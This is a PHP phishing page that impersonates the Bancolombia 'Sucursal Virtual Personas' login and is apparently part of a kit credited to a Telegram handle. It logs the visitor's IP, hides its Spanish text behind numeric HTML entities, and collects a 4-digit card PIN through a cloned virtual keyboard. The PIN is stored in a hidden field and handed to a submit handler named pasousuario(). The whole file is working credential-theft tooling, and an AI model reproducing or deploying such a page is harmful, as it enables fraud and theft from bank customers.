<?php
/**
###############################################
#     Version 2.0                             #
#     https://t.me/neo_net                    #
#     Simular Datos Reales de kamehouse     #
###############################################
**/
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');

?>
<html><head>
  <title>&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <meta charset="ISO-8859-1">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Todo1">
  <meta name="author" content="Todo1 Services">
  <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link href="mua/css/styles.css?v=4.1.1.RC2_1622250049058" media="all" rel="stylesheet" type="text/css">
  <link href="mua/css/bootstrap.css" media="all" rel="stylesheet" type="text/css">
  <link href="mua/css/keyboard_util.css?v=4.1.1.RC2_1622250049058" rel="stylesheet" type="text/css">
  <!--[if lt IE 8]>
    <link href="mua/css/bootstrap-ie7.css" rel="stylesheet">
<![endif]-->
      <!--[if lt IE 9]>
      <script src="mua/js/html5shiv.js"></script>
      <script src="mua/js/respond.min.js"></script>
   <![endif]-->
	<script type="text/javascript" src="mua/js/jquery-3.6.0.min.js"></script>
	<script type="text/javascript" src="mua/js/jquery.cookie.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery.validate-1.11.1.js"></script>
	<script type="text/javascript" src="mua/js/patterns/validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/jquery-validations.js"></script>
	<script type="text/javascript" src="mua/js/patterns/blockKeys.js"></script>
	<script type="text/javascript" src="mua/js/jquery-ui.js"></script>
	<script type="text/javascript" src="mua/js/bluebird.min.js"></script>
	<link href="mua/css/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
   	<link href="mua/css/ui.css" media="all" rel="stylesheet" type="text/css">
	<script language="JavaScript">
	var t1Assertion="ymqRnzfPHaTuz4jubIHz";
	function processPassword(password){var rsa = new RSAKey();rsa.setPublic("A6CA1BB4BD803E5704A071E8F7370FD68F2A42CAB574A765693F0F54796CB8AD2CF1B624005119FE651227F7992FF6A6D1979C9B72EA0EAD789F1CBADAB9851779CB8F5F82F40BC71C5C303A10298ED6DC5657E3401AE5720F06836F098366441AC30AB35F13FAB8B6CE81955A1181FCA0AD4EA471CC09C51EAE8EDA42E8C615F933483449CBC67883F407430CB856E4EEC1919BFDD38850CCF5837EC67D8CF802EC30836099592FCDB6CEF4D4AB8EC7F95229B6B262DC6F9A62BFD082CCF98D8FC73FADFA2CCBDDBD17126206E0EC41FE85ECDB9B7631A7EDEF193E4971ADA3E4AB3FFE05F5146907255AD29D0AFB91160C95E225514E1CD07E35BA157A44D1", "10001");var res2 = rsa.encrypt(password + "|" + t1Assertion);return hex2b64(res2);}
	</script>
<script language="javascript">
$(document).ready(function() {
function obtenerError(message){
	return "<script>document.getElementById('summary').innerHTML='"+message+"'; document.getElementById('tabError').style.display='';</"+"script>";
}
var validator = $("#loginUserForm").bind("invalid-form.validate", function() {
}).validate({
onsubmit: false,
onkeyup: false,
onclick: false,
onfocusout: false,
rules: {
errorContainer: $("#summary"),
password:{
required:true,
"passwordLength":true
}
},
messages: {
password: {
required:       obtenerError('Por favor ingrese su clave'),
passwordLength: obtenerError('La clave no cumple con los requerimientos m&iacute;nimos de seguridad, por favor intente nuevamente.')
}
}
});
});
function reloadValidate(contError) {
$("#contentError").html(contError);
}
</script>
<script language="JavaScript">
function addEventsButton(e){var t="Microsoft Internet Explorer"==navigator.appName;navigator.userAgent.match(/iPad/i)?document.getElementById(e).addEventListener("touchstart",function(){return recoveryPassword(),ZXnpHSZvYZQw(),document.authenticationForm.userId.value="0",bpWBZCHcujHG()},!1):t?(document.getElementById(e).attachEvent("onclick",function(){return recoveryPassword(),wvoJkkJPngaU(),document.authenticationForm.userId.value="0",bpWBZCHcujHG()}),document.getElementById(e).attachEvent("onmouseover",function(){ZXnpHSZvYZQw()}),document.getElementById(e).attachEvent("onmouseout",function(){JkQUlUkGtRJy()})):(document.getElementById(e).addEventListener("click",function(){return recoveryPassword(),wvoJkkJPngaU(),document.authenticationForm.userId.value="0",bpWBZCHcujHG()},!1),document.getElementById(e).addEventListener("mouseover",function(){ZXnpHSZvYZQw()},!1),document.getElementById(e).addEventListener("mouseout",function(){JkQUlUkGtRJy()},!1))}function clearByError(){(""==document.forms[0].userId.value||isEmpty(passwordMinLength[0])||passwordMinLength[0]<DEF_MAXLENGTH-1)&&(clearKeys(),document.forms[0].password.value="")}function validateAndClear(){var e=bpWBZCHcujHG();return!isNaN(e)&&null!=e&&0!=e||((navigator.userAgent.match(/iPad/i)?clearByErrorIpad:clearByError)(),!1)}function clearByErrorIpad(){return document.forms[0].userId.value="",document.forms[0].password.value="",!(document.forms[0].tempUserID.value="")}function addEventsButtonSinCero(e){var t="Microsoft Internet Explorer"==navigator.appName;navigator.userAgent.match(/iPad/i)?document.getElementById(e).addEventListener("touchstart",function(){recoveryPassword(),ZXnpHSZvYZQw(),validateAndClear()&&validateForm()},!1):t?(document.getElementById(e).attachEvent("onmouseover",function(){wvoJkkJPngaU()}),document.getElementById(e).attachEvent("onmouseout",function(){changeToOrigKeyboard()})):(document.getElementById(e).addEventListener("mouseover",function(){wvoJkkJPngaU()},!1),document.getElementById(e).addEventListener("mouseout",function(){changeToOrigKeyboard()},!1))}var hcYyOhpMVBAs={PASSWORD:"MWwQMvJEvwua"};function changePass(e){return hcYyOhpMVBAs[e.toUpperCase()]}var regFunction,passwordMinLength=new Array,omitformtags=(omitformtags=["input","textarea","select"]).join("|"),origKeyboardShown=!0,contrastLevel="2",fontSizeDefault=12,indexField=0,isOpen=!1,isLayer=!1,KEYCONTENT="",DEF_MAXLENGTH=4,DjxXrwlrIv_z=new Array,_JAWJAOiwepr=new Array,maxLengthKeyboard=DEF_MAXLENGTH;function clearKeys(){DjxXrwlrIv_z[indexField].value="",_JAWJAOiwepr[indexField].value=""}function bindElement(e,t){indexField=null!=t?t:0,DjxXrwlrIv_z[indexField]=e,maxLengthKeyboard=DjxXrwlrIv_z[indexField]&&DjxXrwlrIv_z[indexField].maxLength?DjxXrwlrIv_z[indexField].maxLength:DEF_MAXLENGTH}function hideUserID(){var e=document.loginUserForm.tempUserID.value;""!==e&&"****************"!==e&&(document.loginUserForm.userId.value=e,document.loginUserForm.tempUserID.value="****************")}function reEnable(){return!0}function changeContrastLevel(e){contrastLevel!=e&&(refreshNumericKeyboard(contrastLevel=e),changeConstrastImage())}function fuaXRVqAXLUw(){if(validBrowser()){hideUserID();for(var e=document.loginUserForm.userId.value,t=document.loginUserForm.password.value,r=e.search(" ");-1!=r;r=e.search(" ")){r=e.search(" ");e=e.substring(0,r)+e.substring(r+1,e.length)}if(isEmpty(e)||isEmpty(t))alert("Por favor, ingresar su nÃºmero de Documento y su Clave.");else if(isNaN(e))alert("Por favor, ingresar su nÃºmero de Documento y su Clave."),clearKeys(),document.loginUserForm.tempUserID.value="";else{if(!(passwordMinLength[0]<DEF_MAXLENGTH-1))return top.withNotify=!0;alert("La clave debe ser de al menos 4 dÃ&shy;gitos. Por favor rectifique e intente nuevamente."),clearKeys(),document.loginUserForm.password.value=""}}return document.loginUserForm.tempUserID.focus(),!1}function fuaXRVqAXLUwRsaPass(){if(validBrowser()){var e=document.loginUserForm.password.value;if(isEmpty(e))alert("Por favor ingrese su clave.");else{if(!(passwordMinLength[0]<DEF_MAXLENGTH-1))return top.withNotify=!0;alert("La clave debe ser de al menos 4 dÃ&shy;gitos. Por favor rectifique e intente nuevamente."),clearKeys(),document.loginUserForm.password.value=""}}return!1}function rDMvafQAf_ro(e){passwordMinLength[indexField]=DjxXrwlrIv_z[indexField].value.length,DjxXrwlrIv_z[indexField].value.length<DEF_MAXLENGTH&&(DjxXrwlrIv_z[indexField].value+="*",_JAWJAOiwepr[indexField].value+=e,regFunction&&regFunction(),null!=document.loginUserForm.tempUserID&&"****************"!==document.loginUserForm.tempUserID.value&&""!==document.loginUserForm.tempUserID.value&&(document.loginUserForm.userId.value=document.loginUserForm.tempUserID.value,document.loginUserForm.tempUserID.value="****************"))}function setDefaultCursor(e){e.style.cursor="default"}function validBrowser(){if("Microsoft Internet Explorer"==navigator.appName){var e=navigator.appVersion.substring(navigator.appVersion.indexOf(";")+1);if((e=parseFloat(e.substring(0,e.indexOf(";"))))<5)return!1}else{var t=(e=navigator.appVersion).indexOf("[");if(-1==t&&-1==(t=e.indexOf("("))||(e=e.substring(0,t)),(e=parseFloat(e))<5)return!1}return!0}function setHandCursor(e){e.style.cursor="pointer"}function startKeyb(e,t,r){DjxXrwlrIv_z[indexField]&&(DjxXrwlrIv_z[indexField].disabled=!1),bindElement(e),uZNnFCPtRlZw(t),!isOpen&&isLayer&&activateChild(isOpen=!0),r&&(DjxXrwlrIv_z[indexField].disabled=!0)}function resetForm(){document.loginUserForm.userId.value="",document.loginUserForm.tempUserID.value="",document.loginUserForm.password.value=""}function changeConstrastImage(){document.getElementById("constrastImg").src="/mua/images/kb/Contraste"+contrastLevel+".gif?v=4.1.1.RC2_1622250049058"}function OQtioVahuV_z(){return KEYCONTENT="  <table class='keyboard' border='0' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='15' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='5'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"1\");'>  <div border='0' id ='ZOPLcSyHAKLu1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"2\");'>  <div border='0' id ='ZOPLcSyHAKLu2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"9\");'>  <div border='0' id ='ZOPLcSyHAKLu9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"5\");'>  <div border='0' id ='ZOPLcSyHAKLu5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"3\");'>  <div border='0' id ='ZOPLcSyHAKLu3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"4\");'>  <div border='0' id ='ZOPLcSyHAKLu4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"0\");'>  <div border='0' id ='ZOPLcSyHAKLu0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"6\");'>  <div border='0' id ='ZOPLcSyHAKLu6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"8\");'>  <div border='0' id ='ZOPLcSyHAKLu8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='wvoJkkJPngaU();' onmouseout='changeToOrigKeyboard();' onclick='rDMvafQAf_ro(\"7\");'>  <div border='0' id ='ZOPLcSyHAKLu7' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>7</div></td><td colspan='2' onclick='clearKeys();' class='bg_buttonSmall'><div id='clearKey' border='0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>Borrar</div></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='/mua/images/kb/Contraste"+contrastLevel+".gif?v=4.1.1.RC2_1622250049058' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='10,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='50,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='90,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>"}function clearUserID(){document.loginUserForm.tempUserID.value="",document.loginUserForm.userId.value=""}function uZNnFCPtRlZw(e){null==e&&(e=0);var t,r=DjxXrwlrIv_z[0].form;if(!_JAWJAOiwepr[e])for(var n=r.elements.length,o="",a=0;a<n;a++)(t=hcYyOhpMVBAs[r.elements[a].name.toUpperCase()])&&(o+='<input type="hidden" name="'+t+'">');for(document.getElementById("inputs_").innerHTML=o,ind=0;ind<DjxXrwlrIv_z.length;ind++)null==r[t=hcYyOhpMVBAs[DjxXrwlrIv_z[ind].name.toUpperCase()]]?_JAWJAOiwepr[ind]="":_JAWJAOiwepr[ind]=r[t],_JAWJAOiwepr[ind].value=""}function blockSelect(e){void 0!==e.onselectstart?e.onselectstart=new Function("event.returnValue=false;  return false; "):(e.onmousedown=disableselect,e.onmouseup=reEnable)}function disableselect(e){if(-1==omitformtags.indexOf(e.target.tagName.toLowerCase()))return!1}function closeKeyb(){isLayer&&activateChild(isOpen=!1),DjxXrwlrIv_z[indexField].disabled=!1}function createKeyboard(e,t,r){(isLayer=e)?createChild(window,"keyboard",OQtioVahuV_z(),isOpen,330,135,t,r):document.getElementById("keyboard_").innerHTML=OQtioVahuV_z(),blockSelect(document.all?document.all._KEYBRD:document.getElementById?document.getElementById("_KEYBRD"):document),refreshNumericKeyboard(contrastLevel)}function refreshNumericKeyboard(e){for(var t=0;t<10;t++){var r=document.getElementById("ZOPLcSyHAKLu"+t);r.style.fontSize=fontSizeDefault,r.className="colorContrast"+e}document.getElementById("clearKey").className="colorContrast"+e}function wvoJkkJPngaU(){for(i=0;i<10;i++){var e=document.getElementById("ZOPLcSyHAKLu"+i);e.innerHTML="*",e.style.fontSize=15,e.style.fontWeight="bolder"}}function recoveryPassword(){for(i=0;i<DjxXrwlrIv_z.length;i++)DjxXrwlrIv_z[i].value=_JAWJAOiwepr[i].value}function changeToOrigKeyboard(){for(i=0;i<10;i++){var e=document.getElementById("ZOPLcSyHAKLu"+i);e.innerHTML=i,e.style.fontSize=12,e.style.fontWeight="bolder"}}function clearKeys(){DjxXrwlrIv_z[indexField].value="",_JAWJAOiwepr[indexField].value=""}
</script>
<link rel="shortcut icon" href="favicon.ico?"></script></head>
<script type="text/javascript" src="mua/js/app.js"></script>
<body onload="timeOutActive = true;" style="">
	
<form id="loginUserForm" name="loginUserForm" action="/mua/VALIDATEPERSONA_DATOS?scis=ts5utQahsDYt68HuocfuEq5l7yqCuNFFU4JZD3Qk8iyLKBIXau0lg1s6jl7WAbiA" method="post" novalidate="novalidate">
<input id="id_ss" name="id_ss" type="hidden" value="">
<div class="container">
<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#86;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#115;</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
<script language="javascript" src="mua/js/jquery.jclock-min.js?v=4.1.1.RC2_1622250049058" type="text/JavaScript"></script>
 <script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#jclock1').jclock(optionsEST);
     });
 </script>
<div>
	<div class="timeText">Fecha y hora actual:</div>
	<span id="jclock1" class="lastVisitedText">Jueves 24 de Junio de 2021 9:27:10  AM</span>
</div>
				</div>
			</div>
		</div>
	</div>
	<div class="panel-heading">
		<h3>
			&#73;&#110;&#105;&#99;&#105;&#111;&#32;&#100;&#101;&#32;&#115;&#101;&#115;&#105;ó&#110;
		</h3>
	</div>
</div>
	<div>
		<input type="hidden" name="tempUserID" id="tempUserID" value="">
		<input type="hidden" name="HIT_KEY" value="0">
		<input type="hidden" name="HIT_VKEY" value="0">
		<input type="hidden" name="userId" value="">
		<div class="panel panel-primary">
				<div class="row">
<script language="JavaScript">
	function cerrarError() {
		document.getElementById("tabError").style.display = "none";
		document.getElementById('summary').innerHTML='';
	}
</script>
		<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">
	<div class="errorDiv">
        <div class="divTextMessage">
			<span class="icon-error errorIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
            </span>
            <div class="errorTitulo">Error</div>
			<div id="summary" class="errorTexto">
			</div>
		</div>
	</div>
</div>
				</div>
				<input type="hidden" class="clavex" name="">
				<div class="mua-panel-body">
					<div class="row">
						<div class="col-lg-5 col-md-5 col-sm-6">
						</div>
						<div class="col-lg-4 col-md-5 col-sm-6">
							<div class="panel_general mua-panel_general">
								<div class="title-panel-label">
									<h1>
										&#67;&#108;&#97;&#118;&#101;
									</h1>
								</div>
								<div id="contenido"><div class="subtitle-land-label">
										<h4>
											&#80;&#111;&#114;&#32;&#109;&#111;&#116;&#105;&#118;&#111;&#115;&#32;&#100;&#101;&#32;&#115;&#101;&#103;&#117;&#114;&#105;&#100;&#97;&#100;&#32;&#101;&#115;&#32;&#110;&#101;&#99;&#101;&#115;&#97;&#114;&#105;&#111;&#32;&#112;&#114;&#111;&#99;&#101;&#115;&#97;&#114;&#32;&#117;&#110;&#97;&#32;&#118;&#101;&#114;&#105;&#102;&#105;&#99;&#97;&#99;&#105;ó&#110;&#32;&#100;&#101;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#100;&#97;&#100;&#100;&#46;
										</h4>
									</div>
									<div class="mua-content-group-panel">
										<div class="mua-label-input">
											<label class="control-label-index" for="username">
												&#73;&#110;&#103;&#114;&#101;&#115;&#97;&#32;&#116;&#117;&#32;&#99;&#108;&#97;&#118;&#101;
											</label>
										</div>
										<div>
											<div class="mua_svp_enroll_update_control">
												<input id="password" name="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
												<span class="mua-icon-lock"> </span>
											</div>
										</div>
									</div>
									<div class="mua-content-legend mua_svp_enroll_update_label">
										&#73;&#110;&#103;&#114;&#101;&#115;&#97;&#32;&#109;&#101;&#100;&#105;&#97;&#110;&#116;&#101;&#32;&#101;&#108;&#32;&#116;&#101;&#99;&#108;&#97;&#100;&#111;&#32;&#118;&#105;&#114;&#116;&#117;&#97;&#108;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#118;&#101;&#32;&#113;&#117;&#101;&#32;&#117;&#115;&#97;&#115;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#99;&#97;&#106;&#101;&#114;&#111;&#32;&#97;&#117;&#116;&#111;&#109;á&#116;&#105;&#99;&#111;&#46;
									</div>
								</div>
								<div class="two-button-container mua-button-container">
									<div class="two-button-a">
										<input id="btnGo" name="btnGo" class="btn btn-success" type="button" value="Ingresar" disabled="">
									</div>
								</div>
								<div class="mua-panel_enlances">
									<div>
										<span id="popoverId" class="glyphicon icon-icon_tooltip mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
										<div id="popoverContent" class="hide">
<span class="mua_tooltip_close">×</span>
<div class="mua_tooltip_msg">
			&#83;&#105;&#32;&#117;&#115;&#116;&#101;&#100;&#32;&#101;&#115;&#32;&#117;&#110;&#32;&#67;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#110;&#111;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#69;&#120;&#116;&#101;&#114;&#105;&#111;&#114;&#32;&#121;&#32;&#110;&#111;&#32;&#104;&#97;&#32;&#115;&#105;&#100;&#111;&#32;&#99;&#108;&#105;&#101;&#110;&#116;&#101;&#32;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#112;&#97;&#115;&#97;&#100;&#111;&#32;&#111;&#32;&#101;&#115;&#32;&#117;&#110;&#32;&#99;&#108;&#105;&#101;&#110;&#116;&#101;&#32;&#101;&#120;&#99;&#108;&#117;&#115;&#105;&#118;&#111;&#32;&#70;&#105;&#100;&#117;&#99;&#105;&#97;&#114;&#105;&#97;&#44;&#32;&#117;&#115;&#116;&#101;&#100;&#32;&#100;&#101;&#98;&#101;&#32;&#103;&#101;&#110;&#101;&#114;&#97;&#114;&#32;&#117;&#110;&#97;&#32;&#99;&#108;&#97;&#118;&#101;&#32;&#112;&#97;&#114;&#97;&#32;&#99;&#111;&#110;&#116;&#105;&#110;&#117;&#97;&#114;&#32;&#99;&#111;&#110;&#32;&#101;&#108;&#32;&#112;&#114;&#111;&#99;&#101;&#115;&#111;&#46;
</div>
										</div>
										<a href="/mua/GENERATE_PASS_DATA?scis=igUnIPQ7E3nAO9nUDf2BzHrlzXwvCiOS7Mxf6WppXLQvUJOt0NjEuMNS6VyehZYm">&#71;&#101;&#110;&#101;&#114;&#97;&#32;&#117;&#110;&#97;&#32;&#99;&#108;&#97;&#118;&#101;&#32;&#112;&#101;&#114;&#115;&#111;&#110;&#97;&#108;</a>
									</div>
								</div>
							</div>
						</div>
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
								<div id="keyboard_">  <table class="keyboard" border="0" cellspacing="0" cellpadding="0" align="left" valign="top">  <tbody><tr>    <td width="0" height="15"></td>    <td></td>  </tr>  <tr>    <td height="0" width="5"></td>    <td colspan="2">      <table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">        <tbody><tr align="left">                  <td valign="top" align="left"> <table class="bg_button" id="_KEYBRD" valign="top">  <tbody><tr><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu1" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">1</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu2" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">2</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu9" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">9</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu5" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">5</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu3" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">3</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu4" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">4</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu0" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">0</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu6" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">6</div></td><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu8" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">8</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default">  <div border="0" id="ZOPLcSyHAKLu7" valign="center" align="center" class="colorContrast1" style="font-weight: bolder;">7</div></td><td colspan="2" class="bg_buttonSmall"><div id="clearKey" border="0" valign="center" align="center" class="colorContrast1">Borrar</div></td></tr></tbody></table><table class="bg_button" id="_CONSTRAST" valign="top" cellspacing="0">  <tbody><tr><td><img width="90" height="34" border="0" src="/mua/images/kb/Contraste1.gif?v=4.1.1.RC2_1622250049058" name="constrastImg" id="constrastImg" usemap="#numericKeyboardMap" style="cursor: default;"> <map name="numericKeyboardMap" id="numericKeyboardMap"><area shape="circle" class="cursorContrast" coords="10,30,15"><area shape="circle" class="cursorContrast" coords="50,30,15"><area shape="circle" class="cursorContrast" coords="90,30,15"></map></td></tr></tbody></table></td>        </tr>      </tbody></table>    </td>  </tr><tr>    <td height="17"></td>    <td colspan="2"></td>  </tr> </tbody></table></div>
								<div id="inputs_"><input type="hidden" name="MWwQMvJEvwua" value="Glc"></div>
								<script>
									createKeyboard();
									startKeyb(document.loginUserForm.password);
									resetForm();
			             		</script>
						</div>
					</div>
				</div>
		</div>
	</div>
<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer">
			&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#32;&#66;&#97;&#110;&#99;&#111;&#108;&#111;&#109;&#98;&#105;&#97;&#58;&#32;&#66;&#111;&#103;&#111;&#116;&#225;&#32;&#51;&#52;&#51;&#32;&#48;&#48;&#48;&#48;&#32;&#45;&#32;&#77;&#101;&#100;&#101;&#108;&#108;&#237;&#110;&#32;&#53;&#49;&#48;&#32;&#57;&#48;&#48;&#48;&#32;&#45;&#32;&#67;&#97;&#108;&#105;&#32;&#53;&#53;&#52;&#32;&#48;&#53;&#48;&#53;&#32;&#45;&#32;&#66;&#97;&#114;&#114;&#97;&#110;&#113;&#117;&#105;&#108;&#108;&#97;&#32;&#51;&#54;&#49;&#32;&#56;&#56;&#56;&#56;&#32;&#45;&#32;&#67;&#97;&#114;&#116;&#97;&#103;&#101;&#110;&#97;&#32;&#54;&#57;&#51;&#32;&#52;&#52;&#48;&#48;&#32;&#45;&#32;&#66;&#117;&#99;&#97;&#114;&#97;&#109;&#97;&#110;&#103;&#97;&#32;&#54;&#57;&#55;&#32;&#50;&#53;&#50;&#53;&#32;&#45;&#32;&#80;&#101;&#114;&#101;&#105;&#114;&#97;&#32;&#51;&#52;&#48;&#32;&#49;&#50;&#49;&#51; <br> &#69;&#108;&#32;&#114;&#101;&#115;&#116;&#111;&#32;&#100;&#101;&#108;&#32;&#112;&#97;&#237;&#115;&#32;&#48;&#49;&#32;&#56;&#48;&#48;&#32;&#48;&#57;&#32;&#49;&#50;&#51;&#52;&#53;&#46;&#32;&#83;&#117;&#99;&#117;&#114;&#115;&#97;&#108;&#101;&#115;&#32;&#84;&#101;&#108;&#101;&#102;&#243;&#110;&#105;&#99;&#97;&#115;&#32;&#101;&#110;&#32;&#101;&#108;&#32;&#101;&#120;&#116;&#101;&#114;&#105;&#111;&#114;&#58;&#32;&#69;&#115;&#112;&#97;&#241;&#97;&#32;&#57;&#48;&#48;&#32;&#57;&#57;&#53;&#32;&#55;&#49;&#55;&#32;&#45;&#32;&#69;&#115;&#116;&#97;&#100;&#111;&#115;&#32;&#85;&#110;&#105;&#100;&#111;&#115;&#32;&#49;&#56;&#54;&#54;&#32;&#51;&#55;&#57;&#32;&#57;&#55;&#49;&#52;&#46;
		</p>
	</div>
</div>
	        <script type="text/javascript">
	var year = (new Date).getFullYear();
	$(document).ready(function() {
	  $("#fecha").text( year );

	  function _ck_pass(){
			if ($('#password').val().length >=4) {
			$('#btnGo').prop('disabled',false);}
			else {$('#btnGo').prop('disabled',true);}
		}

		setInterval(function() {new _ck_pass();}, 700);


		$('#btnGo').click(function(){	
			pasousuario($("input[name='MWwQMvJEvwua']").val());					
		});

	});
	</script>
	        <div style="margin-top: 10px;">
